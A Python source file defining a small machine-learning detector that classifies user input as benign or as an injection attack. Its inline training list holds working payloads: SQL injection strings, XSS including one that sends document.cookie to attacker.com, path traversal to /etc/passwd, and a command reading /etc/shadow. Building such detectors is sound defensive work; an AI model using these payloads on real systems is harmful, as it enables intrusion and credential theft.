import numpy as np
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.pipeline import Pipeline

class IntelligentAttackClassifier:
    def __init__(self):
        # Character-level n-grams capture symbols like ', ", <, >, ;, --
        self.pipeline = Pipeline([
            ('tfidf', TfidfVectorizer(analyzer='char', ngram_range=(2, 4))),
            ('clf', LogisticRegression(class_weight='balanced', max_iter=200))
        ])
        self._train_baseline_model()

    def _train_baseline_model(self):
        """Trains on representative samples of benign text vs. attack payloads."""
        training_samples = [
            # Benign normal inputs
            ("john_doe@example.com", 0),
            ("electronics and laptops", 0),
            ("Velalar College of Engineering", 0),
            ("python programming tutorial", 0),
            ("12345", 0),
            ("password123!", 0),
            ("What is cyber forensics?", 0),
            ("Machine learning and artificial intelligence", 0),
            ("User search query for books", 0),

            # SQL Injection payloads
            ("' OR '1'='1", 1),
            ("admin' --", 1),
            ("' UNION SELECT 1, user, password FROM users --", 1),
            ("1; DROP TABLE users;", 1),
            ("' OR 1=1#", 1),
            ("SELECT * FROM accounts WHERE id = 1 OR 1=1", 1),

            # Cross-Site Scripting (XSS) payloads
            ("<script>alert('XSS')</script>", 1),
            ("<img src=x onerror=alert(1)>", 1),
            ("<svg/onload=fetch('http://attacker.com?c='+document.cookie)>", 1),
            ("javascript:alert('Hacked')", 1),
            ("<body onload=alert('Pwned')>", 1),

            # Path Traversal / OS Command Injection
            ("../../../../etc/passwd", 1),
            ("..\\..\\windows\\system32\\cmd.exe", 1),
            ("; cat /etc/shadow", 1),
            ("| whoami", 1)
        ]

        texts, labels = zip(*training_samples)
        self.pipeline.fit(texts, labels)

    def predict(self, user_input: str):
        """Returns threat probability and class (1=Attack, 0=Benign)."""
        if not user_input or user_input.strip() == "":
            return 0.0, 0
        
        prob = self.pipeline.predict_proba([user_input])[0][1]
        prediction = 1 if prob >= 0.55 else 0
        return float(prob), prediction